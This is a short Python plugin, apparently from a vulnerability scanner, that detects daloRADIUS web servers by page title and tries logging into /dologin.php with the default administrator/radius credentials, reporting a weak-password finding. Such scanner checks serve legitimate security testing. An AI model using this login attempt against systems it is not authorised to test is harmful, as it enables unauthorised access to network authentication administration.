# -*- coding:utf-8 -*-
# daloradius弱密码

from .. import fileUtil
from ServiceScanModel.models import ServiceScan
from vulscan_Project.requestClass import Requests


class POC:
    def __init__(self, service: ServiceScan):
        self.service = service
        self.requestUtil = Requests(service.cookies)

    def test_pwd(self, url):
        resp = self.requestUtil.post(url + "/dologin.php",
                                     data={"operator_user": "administrator", "operator_pass": "radius"})
        if "daloRADIUS Web Management Server" in resp.text:
            return (True)

    def fingerprint(self):
        try:
            if "daloradius" in self.service.title.lower():
                return True
        except:
            return False

    def poc(self):
        try:
            if self.test_pwd(url=self.service.url):
                return ["daloradius弱密码", "用户名: administrator<br>密码: radius"]
        except:
            return []
